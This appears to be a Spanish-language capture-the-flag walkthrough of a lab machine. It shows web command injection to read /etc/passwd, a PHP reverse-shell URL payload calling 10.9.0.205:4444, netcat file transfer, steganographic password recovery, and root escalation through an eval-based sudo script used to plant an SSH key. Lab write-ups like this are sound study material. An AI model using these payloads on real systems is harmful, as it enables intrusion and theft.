Realizamos un escaneo de nmap y encontramos los siguientes puertos abiertos
![[Pasted image 20240906084644.png]]

Al acceder al puerto 80 nos encontramos con la siguiente web
![[Pasted image 20240906084758.png]]

Analizamos la web y de primeras no encontramos nada relevante que podamos explotar
![[Pasted image 20240906084921.png|500]]

Enumeramos archivos y directorios pero no obtenemos nada
![[Pasted image 20240906085820.png]]

Ahora analizamos el subdirecorio de assets
![[Pasted image 20240906091503.png]]

Intentamos acceder al directorio de images pero sin exito
![[Pasted image 20240906091537.png]]

Intentamos hacer una injección de comandos y nos devuelve una cadena en base 64
![[Pasted image 20240906091808.png]]

Lo decodificamos en base64 y obtenemos la siguiente salida que parecen unas url, 
![[Pasted image 20240906091934.png]]

Volvemos a realizar la injección de comandos en el fichero `/tec/passwd` y nos devuelve la salida en base64
![[Pasted image 20240906092220.png]]

La decodificamos y obtenemos el listado de usuarios
![[Pasted image 20240906092329.png]]

Ahora intentaremos generarnos la reverse shell, para ello ejecutamos el payload en el navegador pero no obtenemos la reverse shell
```
http://school.thm/assets/index.php?cmd=php -r '$sock=fsockopen("10.9.0.205",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
![[Pasted image 20240906092855.png]]

Asi que codificamos la URL y ahora si obtenemos la reverse shell
```
http://school.thm/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.9.0.205%22%2C4444%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```
![[Pasted image 20240906093022.png]]

Este es el programa que nos ha permitido generarnos la reverse shell
![[Pasted image 20240906094113.png]]

Nos generamos una shell estable y ahora buscaremos escalar privilegios al usuario deku
![[Pasted image 20240906093916.png]]

Dentro de la carpeta de `images` tenemos dos imagenes
![[Pasted image 20240906094654.png]]

Nos las transferimos a nuestra maquina, para ello usaremos netcat con el siguiente comando estando en escucha con nuestra maquina
```
nc -lvnp 1234 > oneforall.jpg
```
![[Pasted image 20240906095513.png]]

 Y en la maquina victima
 ```
nc 10.9.0.205 1234 < oneforall.jpg
```
![[Pasted image 20240906095531.png]]

Y ya tendremos los dos ficheros
![[Pasted image 20240906095552.png]]

Si revisamos los ficheros descargados encontramos que `oneforall.jpg` esta mal configurado en comparación con la otra imagen que podemos ver que esta bien y contiene datos
![[Pasted image 20240906102732.png]]

Utilizaremos la herramienta `hexedit`que es un editor hexadecimal que nos permite modificar archivos a nivel binario, para ello la instalamos con el siguiente comando
```
apt install hexedit -y
```
![[Pasted image 20240906102635.png]]

Ahora para modificar un fichero `oneforall.jpg` ejecutamos el siguiente comando
```
hexedit oneforall.jpg
```

Esto es lo que nos aparece al abrir el fichero con hexedit, a la izquierda tenemos el desplazamiento o Offset, que es la posición del archivo, la culumna del centro nos muestra los datos en formato hexadecimal y a la derecha nos muestra los datos en ASCII
![[Pasted image 20240906105333.png]]

# Firma de archivos
Ahora modificaremos la firma de archivos.
Una **firma de archivo** o **magic number** es una secuencia específica de bytes que aparece al principio de un archivo y que identifica su tipo o formato. Estas firmas permiten que los sistemas operativos, herramientas de análisis de archivos, y otras aplicaciones identifiquen correctamente el tipo de archivo, incluso si la extensión (como `.jpg`, `.png`, `.exe`) es incorrecta o ha sido modificada.

## **Ejemplos de firmas de archivo:**
Aquí algunos ejemplos de firmas comunes:
- **JPEG (JPG)**: Los archivos JPEG comienzan con la secuencia `FF D8 FF`.
- **PNG**: Los archivos PNG empiezan con la secuencia `89 50 4E 47` (que corresponde al texto "PNG" en ASCII).
- **PDF**: Los archivos PDF empiezan con la secuencia `25 50 44 46` (que corresponde a "%PDF").
- **ZIP**: Los archivos ZIP comienzan con `50 4B 03 04`.

Estas firmas son útiles para muchas tareas, como el análisis forense de archivos, la recuperación de datos, o incluso para engañar a sistemas automatizados sobre el tipo de archivo (al modificar la firma).

En el siguiente enlace tenemos una lista de las firmas de archivos `file signature`
https://en.wikipedia.org/wiki/List_of_file_signatures?source=post_page-----ad58403aad4f--------------------------------

Buscamos en la web y encontramos los datos a modificar
![[Pasted image 20240906110003.png]]

Los modificamos
![[Pasted image 20240906110120.png]]

Y ahora lo volvemos a analizar con file
![[Pasted image 20240906110144.png]]

También podriamos usar hexeditor, una herramienta mas compleja
![[Pasted image 20240906110333.png]]

Al intentar obtener los metadatos con steguide nos solicita una password
![[Pasted image 20240906112650.png]]

Buscando en la maquina comprometida encontramos unas credenciales en base 64
```
QWxsbWlnaHRGb3JFdmVyISEhCg==
```
![[Pasted image 20240906115552.png]]

Lo decodificamos y obtenemos una password
```
AllmightForEver!!!
```
![[Pasted image 20240906115655.png]]

Lo comprobamos y conseguimos extraer los datos, al leer el fichero extraido parece mostrarnos la constraseña del ususario `deku`
```
deku
One?For?All_!!one1/A
```
![[Pasted image 20240906115744.png]]

Probamos las credenciales por ssh y ya hemos escalado privilegios al usuario deku
![[Pasted image 20240906120232.png]]

Obtenemos la flag de user
![[Pasted image 20240906120255.png]]

Ahora escalaremos los privilegios a root, para ello empezamos buscando directorios o archivos los cuales tengamos permisos para poder acceder como root pero no obtenemos exito
![[Pasted image 20240906123115.png]]

Revisamos los puertos en escucha pero seguimos sin tener exito
![[Pasted image 20240906123247.png]]

Ahora transferimos el binario de `pspy64` para analizar los procesos que se estan ejecutando
![[Pasted image 20240906123815.png]]
![[Pasted image 20240906123830.png]]

Lo ejecutamos y encontramos un par de tareas que se ejecutan como root
```
/lib/systemd/systemd-udevd
/usr/lib/php/sessionsclean
```
![[Pasted image 20240906130418.png]]


Revisamos los permisos de sudo y encontramos un fichero bash
![[Pasted image 20240906131743.png]]

Al leerlo nos encontramos con el siguiente codigo
![[Pasted image 20240906133008.png]]
```Bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback


if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input." 
fi
```

El código realiza la siguiente acción:
- **Lectura del feedback**: El script solicita al usuario que introduzca una entrada mediante el comando **`read feedback`**, guardando el texto ingresado en la variable **`$feedback`**.
- **Validación de la entrada**: Luego, intenta filtrar ciertos caracteres peligrosos (`\``,` )`,` $(`,` |`,` &`,` ;`,` ?`,` !`,` `), que podrían ser utilizados para inyectar comandos maliciosos.
- **Uso del comando eval**: El comando **`eval`** ejecuta el contenido de **`$feedback`** como si fuera un comando de shell. Esto es peligroso porque si puedes insertar contenido que pase los filtros de validación, podrías inyectar y ejecutar comandos arbitrarios con privilegios de **root**.
	- eval "echo $feedback"
- **Guarda el feedback**: Finalmente, el feedback ingresado se guarda en **`/var/log/feedback.txt`**, pero esto no afecta directamente la vulnerabilidad de escalada de privilegios.

Ahora intentaremos obtener acceso por root por ssh creando una clave publica y con el script enviarla al fichero de `root/.ssh/authorized_keys`, para ello primero creamos la clave publica
![[Pasted image 20240906134847.png]]

Cambiamos los permisos de ejecución de nuestro archivo id_rsa
![[Pasted image 20240909091350.png]]

Ahora copiamos nuestra clave publica
![[Pasted image 20240909091443.png]]

Y al ejecutar el archivo .sh pegamos la clave, como podemos ver la clave a sido pegada correctamente
```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIljhFfU+cHwqbckjvHx9NqPHfrd/0C+FaAyXySRkA/d kali@kali > /root/.ssh/authorized_keys
```
![[Pasted image 20240909093622.png]]

Ahora solo queda comprobar si ha funcionado conectándonos por ssh con la clave privada generada y ya habríamos escalado privilegios a root
![[Pasted image 20240909093706.png]]
![[Pasted image 20240909093746.png]]

Y esta es la bandera de root
![[Pasted image 20240909093818.png]]